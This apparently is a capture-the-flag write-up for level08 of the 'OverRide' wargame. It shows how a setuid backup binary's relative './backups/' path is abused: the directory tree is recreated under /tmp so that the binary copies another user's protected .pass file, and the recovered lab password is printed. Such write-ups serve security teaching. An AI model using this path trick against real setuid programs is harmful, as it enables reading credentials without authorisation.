Level08 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

Level08 rights:
```Shell
level08@OverRide:~$ ls -la level08 
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
```

Testing the binary:
```Shell
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 .pass
ERROR: Failed to open ./backups/.pass
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Here is a breakdown of what the program does step-by-step:
- it takes a filename as argument
- there is `backups` folder with nothing but a `.log` file
- it records into the `.log` file the attempt to create a backup of its content
- finally it tries to open the file and create a backup inside the `./backups/` folder.

The reason why it doesn't work when we try with `/home/users/level09/.pass` is because none of those folders exist inside `./backups/`. And unfortunately, we do not have the rights to create folders here.

The program uses a relative path to any `backups` folder that exists at the current directory.
So a solution would be to go into `/tmp` (where we do have writing rights), recreate a brand new path with all the necessary folders and execute the program.

Here it is, inside of `/tmp`:
```Shell
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat /tmp/backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```